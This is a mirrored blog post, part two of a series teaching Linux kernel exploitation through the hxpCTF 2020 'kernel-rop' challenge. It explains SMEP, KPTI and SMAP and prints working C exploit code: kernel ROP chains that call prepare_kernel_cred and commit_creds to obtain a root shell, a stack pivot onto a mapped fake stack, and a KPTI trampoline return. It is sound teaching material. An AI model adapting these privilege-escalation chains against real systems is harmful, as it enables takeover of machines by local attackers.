---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Learning Linux Kernel Exploitation - Part 2"
subtitle: ""
summary: "The second part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Adding SMEP, KPTI and SMAP"
authors: []
tags: []
categories: []
date: 2021-01-28T16:04:24+07:00
lastmod: 2021-01-28T16:04:24+07:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---
**This post is mirrored from its [original post at my blog](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/), some texts/links here maybe broken.**

{{< toc >}}

## Preface
Welcome to the second part of **Learning Linux Kernel Exploitation**. In the [first part](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/), I have introduced what this series is about, demonstrated how to setup the environment and successfully implemented the simplest kernel exploit technique `ret2usr`, while explaining each and every steps in the exploitation using the environment provided by `hxpCTF 2020` challenge `kernel-rop`. In this part, what I'm going to do is to gradually adding more mitigation features, namely `SMEP`, `KPTI`, and `SMAP`, one-by-one, explain how they can change our exploit method, then rebuild our exploitation to bypass them in different assumed scenarios. 

I probably won't re-explain what I have demonstrated and developed in the [first part](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/), so if some contents in this post don't make sense to you, give the first part a shot, because I might have explained it there. 

With those in mind, let's start cracking up the difficulty.

{{% callout %}}
*Use the table of contents on the right to navigate to the section that you are interested in.*
{{% /callout %}}

## Adding SMEP
### Introduction
`SMEP`, abbreviated for [Supervisor mode execution protection (SMEP)](https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf), is a feature which marks all the userland pages in the page table as non-executable when the process is exectuting in `kernel-mode`. In the kernel, this is enabled by setting the `20th bit` of Control Register `CR4`. On boot, it can be enabled by adding `+smep` to `-cpu`, and disabled by adding `nosmep` to `-append`.

Recall from the last part, where we achieved root privileges using a piece of code that we wrote ourselves, this strategy won't be viable anymore with `SMEP` on. The reason is because our piece of code retains in `user-space`, and as I have explained above, `SMEP` has already marked the page which contains our code as non-executable when the process is executing in `kernel-mode`. Recall further back to when most of us learned userland pwn, this is effectively the same as setting `NX` bit to make the stack non-executable. That is the time when we were introduced to `Return-oriented programming (ROP)` after learning `ret2shellcode`. The same concept applies with kernel exploitation, I will now introduce `kernel ROP` after having introduced `ret2usr`.

{{% callout %}}
*As I have mentioned in part 1, readers are assumed to have sufficient knowledge about userland exploitation, therefore, I won't explain what ROP is all over again. You can always look it up in a lot of resources on the Internet since it's a basic technique.*
{{% /callout %}}

For a wider range of coverage on different exploitation techniques that can be used, I'm gonna assume 2 distinct scenarios, then dive in each of them:
1. The *first scenario* is exactly the one we are dealing with: we have the ability to write to the kernel stack an (almost) arbitrary amount of data.
2. The *second scenario* is where I will assume that we can only overwrite up to the return address on the kernel stack, nothing more. This will make exploiting a little bit more complicated.

Let's start by investigating the *first scenario*.

### The attempt to overwrite CR4
As I have mentioned above, in the kernel, the 20th bit of Control Register `CR4` is responsible for enabling or disabling `SMEP`. And actually, while executing in `kernel-mode`, we have the power to modify the content of this register with asm instructions such as `mov cr4, rdi`. Instruction such as that comes from a function called `native_write_cr4()`, which overwrites the content of `CR4` with its parameter, and it resides in the kernel itself. So my first attempt to bypass `SMEP` is to ROP into `native_write_cr4(value)`, where `value` is set to clear the 20th bit of `CR4`.

The same as `commit_creds()` and `prepare_kernel_cred()`, we can find the address of that function by reading `/proc/kallsyms`:
```bash
cat /proc/kallsyms | grep native_write_cr4
-> ffffffff814443e0 T native_write_cr4
```

{{% callout %}}
*For all the exploitation that I will introduce in this post, I will only explain the parts that are different from `ret2usr`. The parts that are exactly the same as the previous post are: **saving the state, opening the device, and leaking stack cookie.***
{{% /callout %}}

The way we build a ROP chain in the kernel is exactly the same as in userland. So here, instead of immediately return into our userland code, we will return into `native_write_cr4(value)`, then return to our privileges escalation code. For the current value of `CR4`, we can get it by either causing a kernel panic and it will be dumped out (or attaching a debugger to the kernel)
```bash
[    3.794861] CR2: 0000000000401fd9 CR3: 000000000657c000 CR4: 00000000001006f0
```

We will clear the 20th bit, which is at the position of `0x100000`, our `value` will be `0x6f0`. Our payload will be as follow:
```C
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long native_write_cr4 = 0xffffffff814443e0;

void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_ret; // return address
    payload[off++] = 0x6f0;
    payload[off++] = native_write_cr4; // native_write_cr4(0x6f0), effectively clear the 20th bit
    payload[off++] = (unsigned long)escalate_privs;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

For gadgets such as `pop rdi ; ret`, we can easily find them by grepping the `gadgets.txt` file that was generated by running `ROPgadget` on the kernel image in the first post.

{{% callout %}}
*It seems that in the kernel image file `vmlinux`, there is no information about whether a region is executable or not, so `ROPgadget` will attempt to find all the gadgets that exist in the binary, even the non-executable ones. If you try to use a gadget and the kernel crashes because it is non-executable, you just have to try another one.*
{{% /callout %}}

In theory, running this should give us a root shell. However, in reality, the kernel still crashes, and even more confusing, the reason for the crash is `SMEP`:
```bash
[    3.770954] unable to execute userspace code (SMEP?) (uid: 1000)
```

Why is `SMEP` still active if we have already cleared the 20th bit? I decided to use `dmesg` to find out if there is anything weird happens to `CR4`, and I found this line:
```bash
[    3.767510] pinned CR4 bits changed: 0x100000!?
```

It seems like the 20th bit of `CR4` is somehow pinned. I then proceeded to google for the source code of `native_write_cr4()` and other resources to clarify the situation, here is the source code:
```C
void native_write_cr4(unsigned long val)
{
	unsigned long bits_changed = 0;

set_register:
	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
}
```

And there is also [a documentation on CR4 bits pinning](https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/). Reading the mentioned resources, it is clear that in newer kernel versions, the 20th and 21st bits of `CR4` are pinned on boot, and will immediately be set again after being cleared, so ***they can never be overwritten this way anymore!***

So my first attempt was a fail. At least we now know that even though we have the power to overwrite `CR4` in `kernel-mode`, the kernel developers have already awared of it and prohibited us from using such thing to exploit the kernel. Let's move on to develop a stronger exploitation that will actually work.

### Building a complete escalation ROP chain
In this second attempt, we will get rid of the idea of getting root privileges by running our own code completely, and try to achieve it by using ROP only. The plan is straightforward:
1. ROP into `prepare_kernel_cred(0)`.
2. ROP into `commit_creds()`, with the return value from step 1 as parameter.
3. ROP into `swapgs ; ret`.
4. ROP into `iretq` with the stack setup as `RIP|CS|RFLAGS|SP|SS`.

The ROP chain itself is not complicated at all, but there are still some hiccups in building it. Firstly, as I mentioned above, there are a lot of gadgets that `ROPgadget` found but are unusable. Therefore, I had to do a lot of trials-and-errors and finally ended up using these gadgets to move the return value in step 1 (stored in `rax`) into `rdi` to pass to `commit_creds()`, they might seem a bit bizarre, but all of the ordinary gadgets that I tried are non-executable:
```C
unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
```

The goal with these 3 gadgets is to move `rax` into `rdi` without taking the `jne`. So I have to pop the value 8 into `rdx`, then return to a `cmp` instruction to make the comparison equals, which will make sure that we won't jump to `jne` branch:
```C
...
payload[off++] = pop_rdx_ret;
payload[off++] = 0x8; // rdx <- 8
payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
payload[off++] = 0x0; // dummy rbx
payload[off++] = 0x0; // dummy rbp
payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
payload[off++] = 0x0; // dummy rbx
payload[off++] = 0x0; // dummy rbp
payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
...
```

Secondly, it seems that `ROPgadget` can find `swapgs` just fine, but it can't find `iretq`, so I have to use `objdump` to look for it:
```bash
objdump -j .text -d ~/vmlinux | grep iretq | head -1
-> ffffffff8100c0d9:       48 cf                   iretq  
```

With the gadgets in hand, we can build the full ROP chain:
```C
unsigned long user_rip = (unsigned long)get_shell;

unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
unsigned long iretq = 0xffffffff8100c0d9;

void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = pop_rdi_ret; // return address
    payload[off++] = 0x0; // rdi <- 0
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = pop_rdx_ret;
    payload[off++] = 0x8; // rdx <- 8
    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
    payload[off++] = 0x0; // dummy rbx
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
    payload[off++] = swapgs_pop1_ret; // swapgs
    payload[off++] = 0x0; // dummy rbp
    payload[off++] = iretq; // iretq frame
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```

And with that, we have successfully built an exploitation that bypasses `SMEP` and opens a root shell in the *first scenario*. Let's move on to see what difficulty we might face in the second one.

### Pivoting the stack
It is clear that we cannot fit the whole ROP chain in the stack anymore with the assumption that we can only overflow up to the return address. To overcome that, we will again use a technique that is also quite popular in userland pwn: `stack pivot`. It is a technique which involves modifying `rsp` to point into a controlled writable address, effectively creating a fake stack. However, while pivoting the stack in userland often involves overwriting the `saved RBP` of a function, then return from it, pivoting in the kernel is much simpler. Because we have such a huge amount of gadgets in the kernel image, we can look for those which modify `rsp/esp` itself. We are most interested in gadgets that move a constant value into `esp`, just make sure that the gadget is executable, and the constant value is properly aligned. This is the gadget that I ended up using:
```C
unsigned long mov_esp_pop2_ret = 0xffffffff8196f56a; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
```

So that's what we will overwrite the return address with, but before that, we have to setup our fake stack first. Since `esp` will become `0x5b000000` after that, we will map a fixed page there, then start writing our ROP chain into it:
```C
void build_fake_stack(void){
    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0x0; // dummy r12
    fake_stack[off++] = 0x0; // dummy rbp
    fake_stack[off++] = pop_rdi_ret;
    ... // the rest of the chain is the same as the last payload
}
```

There are 2 things that should be noticed in the above code:
1. I mmapped the pages at `0x5b000000 - 0x1000` instead of exactly `0x5b000000`. This is because functions like `prepare_kernel_cred()` and `commit_creds()` make calls to other functions inside them, causing the stack to grow. If we point our `esp` at the exact start of the page, there will not be enough space for the stack to grow and it will crash.
2. I must write a dummy value into the first page, otherwise it will create a `Double Fault`. According to my understanding, the reason being the pages are only inserted to the page table after being accessed, not after being mapped. We mapped `0x2000` bytes which equal to 2 pages, and we put our ROP chain entirely in the second page, so we have to access the first page as well.

And that is how we get a root shell while only being able to overflow the stack up to the return address. It also concludes my introduction to bypassing `SMEP`, let's now add one more mitigation, namely `KPTI`.

## Adding KPTI
### Introduction
`KPTI`, abbreviated for [Kernel page-table isolation](https://lwn.net/Articles/741878/), is a feature which separates `user-space` and `kernel-space` page tables entirely, instead of using just one set of page tables that contains both `user-space` and `kernel-space` addresses. One set of page tables includes both `kernel-space` and `user-space` addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of `user-space` and a *minimal set of `kernel-space` addresses*. It can be enabled/disabled by adding `kpti=1` or `nopti` under `-append` option.

This feature is very unique to the kernel and was introduced to prevent `meltdown` in Linux kernel, therefore, there will be no equivalence in the userland to compare to this time. Firstly, trying to run any of the exploits in the last section will cause a crash. But the interesting thing is, the crash is a normal userland `Segmentation fault`, not a crash in the kernel. The reason is because even though we have already returned the execution to user-mode, the page tables that it is using is still the kernel's, with all the pages in userland marked as `non-executable`.

Bypassing `KPTI` is actually not complicated at all, here are the 2 methods that I have read about in some writeups:
1. Using a `signal handler` (method by `@ntrung03` in [this writeup](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)): this is a very clever solution, the fact that it is so simple. The idea is that because what we are dealing with is a `SIGSEGV` in the userland, we can just add a signal handler to it which calls `get_shell()` by simply inserting this line in to `main`: `signal(SIGSEGV, get_shell);`. I still don't fully understand this though, because for whatever reasons, even though the handler `get_shell()` itself also resides in non-executable pages, it can still be executed normally if a `SIGSEGV` is caught (instead of looping the handler indefinitely or fallback to default handler or undefined behavior, etc.), but it does work.
2. Using a `KPTI trampoline` (used by most writeups): this method is based on the idea that if a syscall returns normally, there must be a piece of code in the kernel that will swap the page tables back to the userland ones, so we will try to reuse that code to our purpose. That piece of code is called a `KPTI trampoline`, and what it does is to swap page tables, `swapgs` and `iretq`. We will take a deeper look at this method.

### Tweaking the ROP chain
The piece of code resides in a function called `swapgs_restore_regs_and_return_to_usermode()`, we can again find the address of it by reading `/proc/kallsyms`:
```bash
cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
-> ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
```

This is what the start of the function looks like in IDA:
```bash
.text:FFFFFFFF81200F10                 pop     r15
.text:FFFFFFFF81200F12                 pop     r14
.text:FFFFFFFF81200F14                 pop     r13
.text:FFFFFFFF81200F16                 pop     r12
.text:FFFFFFFF81200F18                 pop     rbp
.text:FFFFFFFF81200F19                 pop     rbx
.text:FFFFFFFF81200F1A                 pop     r11
.text:FFFFFFFF81200F1C                 pop     r10
.text:FFFFFFFF81200F1E                 pop     r9
.text:FFFFFFFF81200F20                 pop     r8
.text:FFFFFFFF81200F22                 pop     rax
.text:FFFFFFFF81200F23                 pop     rcx
.text:FFFFFFFF81200F24                 pop     rdx
.text:FFFFFFFF81200F25                 pop     rsi
.text:FFFFFFFF81200F26                 mov     rdi, rsp
.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]
.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]
.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]
.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]
.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]
.text:FFFFFFFF81200F41                 push    qword ptr [rdi]
.text:FFFFFFFF81200F43                 push    rax
.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
...
```

As you can see, it first recovers a lot of registers by popping from the stack. However, what we are actually interested in is the parts where it swaps the page tables, `swapgs` and `iretq`, and not this part. Simply ROP into the start of this function works fine, but it will unnecessarily enlarge our ROP chain due to a lot of dummy registers need to be inserted. As a result, our `KPTI trampoline` will be at `swapgs_restore_regs_and_return_to_usermode + 22` instead, which is the address of the first `mov`. 

After the initial registers restoration, below are the parts that are useful to us:
```bash
.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
.text:FFFFFFFF81200F89                               pop     rax
.text:FFFFFFFF81200F8A                               pop     rdi
.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
...
.text.native_swapgs:FFFFFFFF8146D4E0                 push    rbp
.text.native_swapgs:FFFFFFFF8146D4E1                 mov     rbp, rsp
.text.native_swapgs:FFFFFFFF8146D4E4                 swapgs
.text.native_swapgs:FFFFFFFF8146D4E7                 pop     rbp
.text.native_swapgs:FFFFFFFF8146D4E8                 retn
...
.text:FFFFFFFF8120102E                               mov     rdi, cr3
.text:FFFFFFFF81201031                               jmp     short loc_FFFFFFFF81201067
...
.text:FFFFFFFF81201067                               or      rdi, 1000h
.text:FFFFFFFF8120106E                               mov     cr3, rdi
...
.text:FFFFFFFF81200FC7                               iretq
```

Notice that there are 2 extra pops at the start, so we still have to put in our chain 2 dummy values. The other snippets is where it `swapgs`, swaps page tables by modifying control register `CR3`, and finally `iretq`. We will tweak the final part of our ROP chain from `SWAPGS|IRETQ|RIP|CS|RFLAGS|SP|SS` to `KPTI_trampoline|dummy RAX|dummy RDI|RIP|CS|RFLAGS|SP|SS`:
```C
void overflow(void){
    // ...
    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
    payload[off++] = 0x0; // dummy rax
    payload[off++] = 0x0; // dummy rdi
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;
    // ...
}
```

{{% callout %}}
*This payload is even easier to build than the one with 2 seperate gadgets for `swapgs` and `iretq` that I have introduced in the last section, and it will also work fine with or without `KPTI` enabled (most of the time `KPTI` will be enabled along with `SMEP`). Therefore, it is recommended to just use this payload as default instead of the old one, that one is just for demonstration purpose. You can also pivot the stack and put this payload in the fake stack when facing the second scenario.*
{{% /callout %}}

And that's how we successfully bypassed `KPTI` in a clean way. Let's move on to the final section of this post and discuss a little bit about `SMAP`.

## Adding SMAP
`SMAP`, abbreviated for [Supervisor Mode Access Prevention (SMAP)](https://lwn.net/Articles/517475/) is introduced to complement `SMEP`, this feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written as well. In the kernel, this is enabled by setting the `21st bit` of Control Register `CR4`. On boot, it can be enabled by adding `+smap` to `-cpu`, and disabled by adding `nosmap` to `-append`.

The situation becomes significantly different for the two scenarios:
1. In the *first scenario*, our whole ROP chain is stored on the kernel stack, and no data are accessed from the userland. Therefore, our previous payload would ***still be viable*** without any modification.
2. However in the *second scenario*, recall that we actually pivot the stack into a page in the userland. Operations like `push` and `pop` the stack require read and write access to it, and `SMAP` prevents that from happening. As a result, the stack pivoting payload would ***no longer be viable***. In fact, as far as I know, our current read and write primitives from the stack is not enough to produce a successful exploit, we would need a far stronger primitive to exploit the kernel module in this case, which may involve knowledge of the `page tables` and `page directory`, or some other advanced topics. I will probably return to this in the future if I'm given an opportunity, maybe when I would face it in a CTF challenge or a real case (hopefully). Investigating and explaining it here would be too complicated for a series that I called **Learning the basics**.

## Conclusion
In this post, I have demonstrated the popular methods to bypass mitigation features such as `SMEP`, `KPTI` and `SMAP`, in 2 different scenarios where we either have unlimited overflow on the stack, or we don't. All of the exploits revolve around the idea of `ROP`, using multiple different gadgets and code stubs in the kernel image itself.

In the next post, I will come back to the original challenge from `hxpCTF` by finally enabling `KASLR`. The post will probably be me reproducing and explaining the original writeup from the authors themselves.

## Appendix
The attempt to bypass `SMEP` by modifying `CR4`'s code is [smep_writecr4.c](smep_writecr4.c).

The full ROP chain code to bypass `SMEP` in the first scenario is [smep_fullchain.c](smep_fullchain.c).

The stack pivot code in the second scenario is [smep_pivot.c](smep_pivot.c).

The code to bypass `KPTI` using signal handler is [kpti_with_signal.c](kpti_with_signal.c).

The code to bypass `KPTI` using KPTI trampoline is [kpti_with_trampoline.c](kpti_with_trampoline.c).
